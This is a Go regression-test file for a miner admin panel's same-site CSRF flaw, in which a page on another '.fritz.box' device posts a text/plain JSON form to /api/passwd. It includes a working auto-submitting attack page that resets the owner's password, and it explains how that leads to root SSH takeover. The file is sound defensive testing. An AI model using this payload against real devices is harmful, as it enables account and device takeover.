package main

// L50-redteam: a page on another host of the same *site* gets the panel's SameSite=Strict cookie. The panel
// itself allows signing in through FRITZ!Box names (loginHostOK: "fritz.box"), and every device on a FRITZ!Box
// network is <name>.fritz.box: "box" is a public suffix, so evil.fritz.box and sclite.fritz.box are the SAME
// site, and the browser attaches the owner's cookie to a form a page on evil.fritz.box (a NAS, a printer UI,
// any LAN box the attacker controls) posts to sclite.fritz.box. The same holds for a DHCP-given domain like
// "home.arpa" or the router's own "xyz.example.net". The authenticated API never looked at Origin, and
// enctype="text/plain" delivers a JSON body, so /api/passwd (no current password needed) took over the miner
// (and with it root over SSH: same password).

import (
	"encoding/base64"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func redteamSetup(t *testing.T) string {
	t.Helper()
	oldAuth, oldFile := auth, *authFile
	*authFile = filepath.Join(t.TempDir(), "auth.json")
	t.Cleanup(func() { authUpgradeWG.Wait(); auth, *authFile = oldAuth, oldFile })
	var a authStore
	a.Username, a.Secret = "owner", base64.StdEncoding.EncodeToString(randBytes(32))
	setPassword(&a, "owner-password-1")
	authMu.Lock()
	auth = a
	authMu.Unlock()
	if err := saveAuth(); err != nil {
		t.Fatal(err)
	}
	return issueCookie("owner")
}

func redteamMux() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("/api/login", handleLogin)
	mux.HandleFunc("/api/passwd", requireAuth(postOnly(handlePasswd)))
	mux.HandleFunc("/api/acknowledge", requireAuth(postOnly(handleAck)))
	return securityHeaders(mux)
}

// what <form method=post enctype=text/plain action=http://sclite.fritz.box/api/passwd> with
// <input name='{"new":"attacker-pw-1","username":"pwn","x":"' value='"}'> sends from evil.fritz.box
func TestRedteamSameSiteCSRFPasswd(t *testing.T) {
	sid := redteamSetup(t)
	body := `{"new":"attacker-pw-1","username":"pwn","x":"="}`
	req := httptest.NewRequest("POST", "http://sclite.fritz.box/api/passwd", strings.NewReader(body))
	req.Host = "sclite.fritz.box"
	req.Header.Set("Origin", "http://evil.fritz.box")
	req.Header.Set("Content-Type", "text/plain")
	req.AddCookie(&http.Cookie{Name: "sid", Value: sid})
	rec := httptest.NewRecorder()
	redteamMux().ServeHTTP(rec, req)
	authMu.RLock()
	user := auth.Username
	authMu.RUnlock()
	if user == "pwn" || checkPassword("attacker-pw-1") {
		t.Fatalf("a form from another origin (evil.fritz.box) changed the login: HTTP %d %s; user now %q", rec.Code, rec.Body.String(), user)
	}
	if rec.Code != http.StatusForbidden {
		t.Fatalf("cross-origin POST: HTTP %d, want 403", rec.Code)
	}
}

// the panel's own page (Origin = its own host, on any port, http or https) and non-browser clients (no Origin)
// keep working
func TestRedteamSameOriginStillWorks(t *testing.T) {
	for _, c := range []struct{ host, origin string }{
		{"192.168.1.20:8080", "http://192.168.1.20:8080"},
		{"192.168.1.20", "https://192.168.1.20"},
		{"sclite.fritz.box", "http://sclite.fritz.box"},
		{"[fd00::5]:8080", "http://[fd00::5]:8080"},
		{"192.168.1.20", ""},
	} {
		sid := redteamSetup(t)
		req := httptest.NewRequest("POST", "http://"+c.host+"/api/acknowledge", strings.NewReader("{}"))
		req.Host = c.host
		if c.origin != "" {
			req.Header.Set("Origin", c.origin)
		} else if secHardened {
			req.Header.Set("X-Requested-With", "panel") // SC Box II: no Origin needs the page's own header (access.go)
		}
		req.Header.Set("Content-Type", "application/json")
		req.AddCookie(&http.Cookie{Name: "sid", Value: sid})
		rec := httptest.NewRecorder()
		redteamMux().ServeHTTP(rec, req)
		if rec.Code != http.StatusOK {
			t.Errorf("host %s origin %q: HTTP %d %s", c.host, c.origin, rec.Code, rec.Body.String())
		}
	}
}

// REDTEAM_SERVE=1: serve the panel's sign-in + /api/passwd on 127.0.0.1:47980 and an "attacker" page on
// 127.0.0.1:47981 for the Playwright proof (redteam_csrf.js maps *.fritz.box to 127.0.0.1).
func TestRedteamServe(t *testing.T) {
	if os.Getenv("REDTEAM_SERVE") == "" {
		t.Skip("manual")
	}
	redteamSetup(t)
	// what a FRITZ!Box's DHCP gives every device (domain fritz.box), so the owner can sign in by name
	rc := filepath.Join(t.TempDir(), "resolv.conf")
	os.WriteFile(rc, []byte("nameserver 192.168.178.1\nsearch fritz.box\n"), 0o644)
	resolvConf = rc
	mux := http.NewServeMux()
	mux.HandleFunc("/api/login", handleLogin)
	mux.HandleFunc("/api/me", handleMe)
	mux.HandleFunc("/api/passwd", requireAuth(postOnly(handlePasswd)))
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) { w.Write([]byte("<html><body>panel</body></html>")) })
	go http.ListenAndServe("127.0.0.1:47980", securityHeaders(mux))
	evil := `<html><body><form id=f method=post enctype="text/plain" action="http://sclite.fritz.box:47980/api/passwd">
<input name='{"new":"attacker-pw-1","username":"pwn","x":"' value='"}'></form><script>f.submit()</script></body></html>`
	go http.ListenAndServe("127.0.0.1:47981", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		w.Write([]byte(evil))
	}))
	select {}
}
